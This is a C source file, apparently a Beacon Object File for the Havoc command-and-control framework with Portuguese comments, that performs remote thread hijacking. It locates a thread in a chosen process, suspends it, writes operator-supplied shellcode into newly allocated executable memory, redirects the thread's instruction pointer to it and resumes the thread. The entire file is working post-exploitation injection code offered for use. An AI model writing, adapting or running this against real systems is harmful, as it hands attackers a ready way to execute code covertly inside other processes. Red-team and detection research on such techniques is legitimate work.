#include <windows.h>
#include "beacon.h"
#include <tlhelp32.h>

#define HAVOC_CONSOLE_GOOD  0x90
#define HAVOC_CONSOLE_INFO  0x91
#define HAVOC_CONSOLE_ERROR 0x92

// Windows API functions para Havoc BOF
WINBASEAPI HANDLE WINAPI KERNEL32$OpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);
WINBASEAPI DWORD WINAPI KERNEL32$SuspendThread(HANDLE hThread);
WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread(HANDLE hThread);
WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$GetThreadContext(HANDLE hThread, LPCONTEXT lpContext);
WINBASEAPI BOOL WINAPI KERNEL32$SetThreadContext(HANDLE hThread, CONST CONTEXT* lpContext);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI VOID WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID); 

// Encontra uma thread suspensa para hijacking
DWORD FindTargetThread(DWORD processID) {
    THREADENTRY32 threadEntry;
    HANDLE hThreadSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); // ✅ Correção na chamada
    DWORD targetThreadID = 0;

    if (hThreadSnap == INVALID_HANDLE_VALUE) return 0;

    threadEntry.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(hThreadSnap, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processID) {
                HANDLE hThread = KERNEL32$OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, threadEntry.th32ThreadID);
                if (hThread) {
                    targetThreadID = threadEntry.th32ThreadID;
                    KERNEL32$CloseHandle(hThread);
                    break;
                }
            }
        } while (Thread32Next(hThreadSnap, &threadEntry));
    }

    KERNEL32$CloseHandle(hThreadSnap);
    return targetThreadID;
}

// Injeta shellcode em um processo remoto
LPVOID InjectShellcodeIntoThread(HANDLE hProcess, unsigned char* shellcode, SIZE_T shellcodeSize) {
    LPVOID remoteBuffer = KERNEL32$VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) return NULL;

    SIZE_T written;
    if (!KERNEL32$WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcodeSize, &written) || written != shellcodeSize) {
        return NULL;
    }

    return remoteBuffer;
}

// Executa o Thread Hijacking
BOOL HijackThread(DWORD processID, unsigned char* shellcode, SIZE_T shellcodeSize) {
    DWORD targetThreadID = FindTargetThread(processID);
    if (!targetThreadID) return FALSE;

    HANDLE hThread = KERNEL32$OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, targetThreadID);
    if (!hThread) return FALSE;

    KERNEL32$SuspendThread(hThread);

    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        KERNEL32$ResumeThread(hThread);
        KERNEL32$CloseHandle(hThread);
        return FALSE;
    }

    LPVOID remoteShellcode = InjectShellcodeIntoThread(hProcess, shellcode, shellcodeSize);
    if (!remoteShellcode) {
        KERNEL32$ResumeThread(hThread);
        KERNEL32$CloseHandle(hThread);
        KERNEL32$CloseHandle(hProcess);
        return FALSE;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_CONTROL;
    KERNEL32$GetThreadContext(hThread, &ctx);
#ifdef _M_X64
    ctx.Rip = (DWORD64)remoteShellcode;
#else
    ctx.Eip = (DWORD)remoteShellcode;
#endif
    KERNEL32$SetThreadContext(hThread, &ctx);
    KERNEL32$ResumeThread(hThread);

    KERNEL32$CloseHandle(hThread);
    KERNEL32$CloseHandle(hProcess);

    return TRUE;
}

VOID go(PVOID Buffer, int Length) {
    datap Parser;
    DWORD processID;
    unsigned char* shellcode;
    int shellcodeSize;

    BeaconDataParse(&Parser, (char*)Buffer, Length);
    processID = BeaconDataInt(&Parser);
    shellcode = (unsigned char*)BeaconDataExtract(&Parser, &shellcodeSize);

    if (HijackThread(processID, shellcode, shellcodeSize)) {
        BeaconPrintf(HAVOC_CONSOLE_GOOD, const_cast<char*>("Thread Hijacking realizado com sucesso no processo ID: %d"), processID);
    } else {
        BeaconPrintf(HAVOC_CONSOLE_ERROR, const_cast<char*>("Falha ao realizar Thread Hijacking no processo ID: %d"), processID);
    }
}
